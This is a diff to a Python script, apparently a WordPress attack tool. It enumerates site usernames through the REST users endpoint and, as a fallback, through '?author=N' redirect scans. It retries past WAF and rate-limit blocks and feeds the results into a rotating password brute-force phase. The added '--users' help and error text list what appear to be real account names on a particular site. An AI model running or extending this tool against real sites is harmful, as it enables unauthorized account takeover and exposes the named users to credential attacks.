@@ -79,44 +79,97 @@ HEADERS = {
 }
 
 
-def enumerate_users(base_url):
-    """Discover all usernames via REST API"""
-    print(f"\n{BOLD}{CYAN}═══ PHASE 1: DISCOVERING ALL USERS ═══{RESET}\n")
-    users_url = urljoin(base_url, "/wp-json/wp/v2/users")
-    print(f"  Target: {users_url}\n")
+def enumerate_users_rest_api(base_url):
+    """Try to discover usernames via WP REST API with retries"""
+    users_url = base_url + "/wp-json/wp/v2/users"
+    print(f"  Method 1: REST API — {users_url}")
 
-    try:
-        resp = requests.get(users_url, headers=HEADERS, timeout=15)
-        print(f"  HTTP {resp.status_code} ({len(resp.content)} bytes)\n")
+    for attempt in range(3):
+        if attempt > 0:
+            wait = attempt * 5
+            print(f"  Retry {attempt}/2 in {wait}s...")
+            time.sleep(wait)
 
-        if resp.status_code == 200:
-            users = resp.json()
-            if isinstance(users, list) and len(users) > 0:
-                usernames = []
-                for u in users:
-                    uid = u.get("id", "?")
-                    slug = u.get("slug", "?")
-                    name = u.get("name", "?")
-                    role = "ADMIN" if uid == 1 else "Staff"
-                    color = RED if uid == 1 else YELLOW
-                    print(f"    {color}[{role:>5}] {slug:<20} ({name}){RESET}")
+        try:
+            resp = requests.get(users_url, headers=HEADERS, timeout=15)
+            print(f"  HTTP {resp.status_code} ({len(resp.content)} bytes)")
+
+            if resp.status_code == 200:
+                users = resp.json()
+                if isinstance(users, list) and len(users) > 0:
+                    usernames = []
+                    print()
+                    for u in users:
+                        uid = u.get("id", "?")
+                        slug = u.get("slug", "?")
+                        name = u.get("name", "?")
+                        role = "ADMIN" if uid == 1 else "Staff"
+                        color = RED if uid == 1 else YELLOW
+                        print(f"    {color}[{role:>5}] {slug:<20} ({name}){RESET}")
+                        usernames.append(slug)
+                    print(f"\n  {GREEN}Found {len(usernames)} accounts via REST API{RESET}")
+                    return usernames
+
+            if resp.status_code in (403, 429, 503):
+                print(f"  {YELLOW}Blocked (HTTP {resp.status_code}) — will retry...{RESET}")
+                continue
+            else:
+                print(f"  {YELLOW}Unexpected HTTP {resp.status_code}{RESET}")
+                break
+
+        except requests.RequestException as e:
+            print(f"  {YELLOW}Error: {e}{RESET}")
+            continue
+
+    return []
+
+
+def enumerate_users_author_scan(base_url):
+    """Fallback: discover usernames by scanning ?author=1,2,3..."""
+    print(f"\n  Method 2: Author ID scan — {base_url}/?author=N")
+    usernames = []
+
+    for author_id in range(1, 20):
+        try:
+            resp = requests.get(
+                f"{base_url}/?author={author_id}",
+                headers=HEADERS,
+                allow_redirects=True,
+                timeout=10
+            )
+            # WordPress redirects /?author=N to /author/username/
+            final_url = resp.url
+            if "/author/" in final_url:
+                slug = final_url.rstrip("/").split("/author/")[-1]
+                if slug and slug not in usernames:
+                    color = RED if author_id == 1 else YELLOW
+                    role = "ADMIN" if author_id == 1 else "Staff"
+                    print(f"    {color}[{role:>5}] ID {author_id:>3} → {slug}{RESET}")
                     usernames.append(slug)
-                print(f"\n  {GREEN}Found {len(usernames)} accounts to test{RESET}")
-                return usernames
+            time.sleep(0.5)  # Be gentle
+        except requests.RequestException:
+            continue
 
-        if resp.status_code == 403:
-            print(f"  {RED}HTTP 403 — Cloudflare/WAF is blocking requests.{RESET}")
-            print(f"  {YELLOW}Your IP may be temporarily blocked from previous testing.{RESET}")
-            print(f"  {YELLOW}Wait 10-15 minutes and try again, or switch networks.{RESET}")
-        elif resp.status_code == 429:
-            print(f"  {RED}HTTP 429 — Rate limited. Wait a few minutes and retry.{RESET}")
-        else:
-            print(f"  {RED}Unexpected response (HTTP {resp.status_code}).{RESET}")
-            print(f"  {YELLOW}First 200 chars: {resp.text[:200]}{RESET}")
-        return []
-    except requests.RequestException as e:
-        print(f"  {RED}Error: {e}{RESET}")
-        return []
+    if usernames:
+        print(f"\n  {GREEN}Found {len(usernames)} accounts via author scan{RESET}")
+    else:
+        print(f"  {YELLOW}No users found via author scan{RESET}")
+    return usernames
+
+
+def enumerate_users(base_url):
+    """Discover all usernames — tries REST API first, then author scan"""
+    print(f"\n{BOLD}{CYAN}═══ PHASE 1: DISCOVERING ALL USERS ═══{RESET}\n")
+
+    # Try REST API first
+    usernames = enumerate_users_rest_api(base_url)
+
+    # Fallback to author scan if REST API fails
+    if not usernames:
+        print(f"\n  {YELLOW}REST API blocked — trying author scan fallback...{RESET}")
+        usernames = enumerate_users_author_scan(base_url)
+
+    return usernames
 
 
 def rotating_bruteforce(base_url, usernames, passwords, rate_per_sec):
@@ -264,6 +317,9 @@ def main():
                         help="Number of top passwords to try (default: 200)")
     parser.add_argument("--wordlist", default=None,
                         help="Custom wordlist file (overrides built-in list)")
+    parser.add_argument("--users", default=None,
+                        help="Comma-separated usernames to test (skips enumeration). "
+                             "Example: --users tadmin,heather,starhalex")
     args = parser.parse_args()
 
     print(f"""
@@ -280,9 +336,20 @@ def main():
     base_url = args.url.rstrip("/")
 
     # Phase 1: Get all usernames
-    usernames = enumerate_users(base_url)
+    if args.users:
+        usernames = [u.strip() for u in args.users.split(",") if u.strip()]
+        print(f"\n{BOLD}{CYAN}═══ PHASE 1: USING PROVIDED USERNAMES ═══{RESET}\n")
+        for u in usernames:
+            color = RED if u == "tadmin" or u == "admin" else YELLOW
+            print(f"    {color}{u}{RESET}")
+        print(f"\n  {GREEN}Testing {len(usernames)} accounts{RESET}")
+    else:
+        usernames = enumerate_users(base_url)
+
     if not usernames:
-        print(f"  {RED}No users found. Cannot proceed.{RESET}")
+        print(f"\n  {RED}No users found. Cannot proceed.{RESET}")
+        print(f"  {YELLOW}Tip: If your IP is blocked, manually specify users:{RESET}")
+        print(f"  {YELLOW}  --users tadmin,heather,starhalex,krystaljean,fernandovega,gemmasmith,kathy{RESET}")
         return
 
     # Load passwords
